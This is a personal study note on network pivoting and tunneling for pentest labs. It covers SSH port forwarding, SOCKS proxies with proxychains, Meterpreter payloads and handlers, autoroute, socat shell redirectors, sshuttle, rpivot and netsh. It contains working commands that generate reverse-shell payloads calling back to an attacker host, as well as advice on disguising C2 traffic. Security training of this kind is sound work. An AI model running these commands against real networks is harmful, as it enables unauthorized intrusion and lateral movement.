### Intro

![[Pasted image 20220618150416.png]]

During a *red team engagement, pentest* or an *Active Directory assessment*, we will often find ourselves in a situation where we might have already compromised the required *credentials, ssh keys, hashes, access tokens* to move onto another host, but there may be no other host directly reachable from the attacking machine. In such a case, you must use a *pivot host* that we have already compromised to find a way to the next target.

One of the most important things to check when landing on a host for the first time is to check our *privilege level, network connections,* and potential *VPN or other Remote Access software*. 

There are many different terms used:
- Pivot Host
- Proxy
- Foothold
- Beach Head system
- Jump Host

Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network. `Tunneling`, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it. Think of it like this:

We have a `key` we need to send to a partner, but we do not want anyone who sees our package to know it is a key. So we get a stuffed animal toy and hide the key inside with instructions about what it does. We then package the toy up and send it to our partner. Anyone who inspects the box will see a simple stuffed toy, not realizing it contains something else. Only our partner will know that the key is hidden inside and will learn how to access and use it once delivered.

Typical applications like VPNs or specialized browsers are just another form of tunneling network traffic.

---

We will inevitably come across several different terms used to describe the same thing in IT & the Infosec industry. With pivoting, we will notice that this is often referred to as `Lateral Movement`.

#### Pivoting

Utilizing multiple hosts to cross `network` boundaries you would not usually have access to. This is more of a targeted objective. The goal here is to allow us to move deeper into a network by compromising targeted hosts or infrastructure

#### Tunneling

Using HTTP to mask C2 traffic from a server we own to the victim host. The key here is obfuscation of our actions to avoid being detected for as long as possible. Utilize protocols like HTTPS over TLS or SSH over other transport protocols.

# The Networking Behind Pivoting

Whether assigned `dynamically` or `statically`, the IP address is assigned to a `Network Interface Controller` (`NIC`). Commonly, the NIC is referred to as a `Network Interface Card` or `Network Adapter`. A computer can have multiple NICs (physical and virtual), meaning it can have multiple IP addresses assigned, allowing it to communicate on various networks. Identifying pivoting opportunities will often depend on the specific IPs assigned to the hosts we compromise because they can indicate the networks compromised hosts can reach. This is why it is important for us to always check for additional NICs using commands like `ifconfig` (in macOS and Linux) and `ipconfig` (in Windows).

## Protocols, Services & Ports

`Protocols` are the rules that govern network communications. Many protocols and services have corresponding `ports` that act as identifiers. Logical ports aren't physical things we can touch or plug anything into. They are in software assigned to applications. When we see an IP address, we know it identifies a computer that may be reachable over a network. When we see an open port bound to that IP address, we know that it identifies an application we may be able to connect to. Connecting to specific ports that a device is `listening` on can often allow us to use ports & protocols that are `permitted` in the firewall to gain a foothold on the network.

Let's take, for example, a web server using HTTP (`often listening on port 80`). The administrators should not block traffic coming inbound on port 80. This would prevent anyone from visiting the website they are hosting. This is often a way into the network environment, `through the same port that legitimate traffic is passing`. We must not overlook the fact that a `source port` is also generated to keep track of established connections on the client-side of a connection. We need to remain mindful of what ports we are using to ensure that when we execute our payloads, they connect back to the intended listeners we set up. We will get creative with the use of ports throughout this module.

# Dynamic Port Forwarding with SSH and SOCKS Tunneling

`Port forwarding` is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.

![[Pasted image 20230318205047.png]]

We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), which we have compromised. We will scan the target Ubuntu server using Nmap to search for open ports.

### Local port Foward

```
ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
```

The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port `1234` to `localhost:3306` on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.

Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the `local port:server:port` argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on `8080`.

Confirming Port Forward with Nmap

```shell-session
rmm0049@htb[/htb]$ ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```

#### Setting up to Pivot

Unlike the previous scenario where we knew which port to access, in our current scenario, we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (`172.16.5.1-200`) network or the entire subnet (`172.16.5.0/23`). We cannot perform this scan directly from our attack host because it does not have routes to the `172.16.5.0/23` network. To do this, we will have to perform `dynamic port forwarding` and `pivot` our network packets via the Ubuntu server. We can do this by starting a `SOCKS listener` on our `local host` (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.

This is called `SSH tunneling` over `SOCKS proxy`. SOCKS stands for `Socket Secure`, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.

This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from `NAT networks`. SOCKS proxies are currently of two types: `SOCKS4` and `SOCKS5`. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that. Let's take an example of the below image where we have a NAT'd network of 172.16.5.0/23, which we cannot access directly.

![[Pasted image 20230318205916.png]]

In the above image, the attack host starts the SSH client and requests the SSH server to allow it to send some TCP data over the ssh socket. The SSH server responds with an acknowledgment, and the SSH client then starts listening on `localhost:9050`. Whatever data you send here will be broadcasted to the entire network (172.16.5.0/23) over SSH. We can use the below command to perform this dynamic port forwarding.

```
ssh -D 9050 ubuntu@10.129.202.64
```
The `-D` argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port `9050`. We can do this using the tool `proxychains`, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's `TCP traffic` to go through hosted proxies like `SOCKS4`/`SOCKS5`, `TOR`, or `HTTP`/`HTTPS` proxies.

## Remote/Reverse Port Forwarding with SSH

We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well. Let's consider the scenario where we can RDP into the Windows host Windows A. As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.

![[Pasted image 20230321150041.png]]

```
ssh -R <internal-IP>:8080:0.0.0.0:8000 ubuntu@<ip> -vN
```
![[Pasted image 20230321150121.png]]

## Meterpreter Tunneling & Port Forwarding

Now let us consider a scenario where we have our Meterpreter shell access on the ubuntu server (the pivot host) and we want to perform enumeration scans through the pivot host but take advantage of the tools and conveniences of Meterpreter.

We can create a Meterpreter shell for the Ubuntu server

```
meterpreter -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 -f elf -o backupjob LPORT=8080
```

Set up the Multi/Handler

```
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run
[*] Started reverse TCP handler on 0.0.0.0:8080
```

#### Ping Sweep

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

We could also perform a ping sweep using a `for loop` directly on a target pivot host that will ping any device in the network range we specify

**Linux**

```bash
for i in {1..254}; do (ping -c 2 172.16.5.$i | grep "bytes from" &); done
```

**Windows - CMD**

```batch
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

**Windows - PowerShell**

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -Count 1 -comp 172.16.5.$($_) -quiet)}
```

There could be cases where the host's firewall blocks ping (ICMPJ), and the ping won't get us successful replies. In these cases we can perform TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host. We will configure the SOCKS proxy for `SOCKS version 4a` and set the port on `9050` and route all traffic received via our Meterpreter session

```bash
msf6 > use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
...
# Confirm it's running
jobs
```

After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. You can add a line in the `proxychains.conf` file if not already present

```
socks4 127.0.0.1 9050
```

Finally we need to tell our socks_proxy module to route all the traffic via our meterpreter session. We can use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0/23 subnet and then route all our proxychains traffic

**Creating Routes with AutoRoute**

```bash
msf6 > use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

```

**Creating Routes with autoroute by running within the Meterpreter session**

```bash
run autoroute -s 172.16.5.0/23
```

Now we can use proxychains from the attack host and run `nmap` to scan the internal network

```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

#### Port Forwarding

Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.


```bash
metrpreter> portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

This makes a local port forward on the attack host on port `3330` and forwards it through the meterpreter session to the internal host's RDP port

```bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

**Netstat Output**

```bash
netstat -anplt
```

#### Meterpreter Reverse Port Forwarding

Similar to local port forwards, Metasploit can also perform `reverse port forwarding` with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host.

```bash
meterpreter> portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

Now we set up a handler on the attack host

```bash
use exploit/handler/multi
set LHOST 0.0.0.0
set LPORT 8081
run
```

The payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o test.exe LHOST=172.16.5.129 LPORT=1234
```

## Socat Redirection with a Reverse Shell

`Socat` is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.

**Starting Socat Listener**

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

## Socat Redirection with a Bind Shell

Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. The below figure should explain the pivot in a much better way.

![[Pasted image 20240914160402.png]]

## SSH for Windows: plink.exe

`Plink`, short for PuTTY Link is a Windows command-line SSH tool that comes part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of 2018, Windows did not have a native SSH included, so users would have to install their own.

![[Pasted image 20240914162602.png]]

**Using PLink.exe**

```cmd
plink -ssh -D 9050 ubuntu@10.129.202.64
```

Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.

## SSH Pivoting with Sshuttle

`Sshuttle` is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR o HTTPS proxy servers. `Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the ubuntu server as a pivot point and route all of the Nmap's network traffic with sshuttle

**Running sshuttle**

```bash
sudo sshuttle -r ubuntu@10.129.39.94 172.16.5.0/23 -v
```

We can now use any tool directly without using proxychains!

## Web Server Pivoting with Rpivot

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.

![[Pasted image 20240914194409.png]]

Start our rpivot SOCKS proxy server to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections

```bash
git clone https://github.com/klsecservices/rpivot.git
```

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Transferring rpivot to the target machine

```bash
scp -r rpivot ubuntu@[IP]:/home/ubuntu
```

On victim

```bash
python2.7 client.py --server-ip 10.10.X.X --server-port 9999
```

## Port Forwarding with Windows Netsh

`Netsh` is a Windows CLI tool that can help with network configuration of a particular Windows system. Here just some uses:
- Finding routes
- Viewing the firewall config
- Adding proxies
- Creating port forwarding rules

Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (`10.129.15.150`,`172.16.5.25`). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.


![[Pasted image 20240914201136.png]]

```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.19
```

Verifying port

```cmd-session
netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.25     3389
```

